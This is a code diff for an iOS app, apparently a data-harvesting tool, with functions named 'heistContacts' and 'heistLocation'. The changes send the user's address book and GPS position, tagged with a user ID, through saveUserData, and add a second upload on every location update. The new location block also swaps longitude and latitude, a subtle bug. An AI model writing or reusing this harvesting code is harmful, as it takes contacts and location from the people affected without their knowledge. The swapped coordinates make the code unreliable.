@@ -18,10 +18,12 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
     
     // UI elements
     @IBOutlet weak var startHeistButton: UIButton!
+    @IBOutlet weak var userIdInput: UITextField!
     
     // private vars
     private var appPermissions = AppPermissions()
     private var isLocationUpdated = false
+    private var userID = ""
 
     override func viewDidLoad() {
         super.viewDidLoad()
@@ -31,14 +33,14 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
     }
 
     @IBAction func startButtonPressed(_ sender: UIButton) {
+        self.userID = userIdInput.text ?? ""
+        
         // location
         self.heistLocation()
         
         // contacts
         self.heistContacts()
-        
-        printUserData()
-        
+                
         var contacts: [String: Any] = [:]
         let jsonTodo: Data
 
@@ -60,12 +62,13 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
             var postData: [String: Any] = [:]
             postData["contacts"] = contacts
             postData["device_type"] = "ios_app"
-            postData["user_id"] = "123"
+            postData["user_id"] = self.userID
+            postData["is_api"] = true;
             
             jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
         } catch {
-          print("Error: cannot create JSON from todo")
-          return
+            print("Error: cannot create JSON from postData")
+            return
         }
         saveUserData(jsonTodo: jsonTodo)
     }
@@ -105,6 +108,25 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
         let location = locations.last
         appPermissions.getLocationManager().stopUpdatingLocation()
         userData.Location = [location?.coordinate.latitude, location?.coordinate.longitude]
+        
+        let jsonTodo: Data
+        var postData: [String: Any] = [:]
+        
+        do {
+            postData["location"] = [
+                "longitude" : location?.coordinate.latitude,
+                "latitude" : location?.coordinate.longitude
+            ]
+            postData["device_type"] = "ios_app"
+            postData["user_id"] = self.userID
+            postData["is_api"] = true;
+            
+            jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
+        } catch {
+          print("Error: cannot create JSON from location postData")
+          return
+        }
+        saveUserData(jsonTodo: jsonTodo)
     }
     func locationManager(_ manager: CLLocationManager, didFailWithError error: Error){
         print("Errors: " + error.localizedDescription)
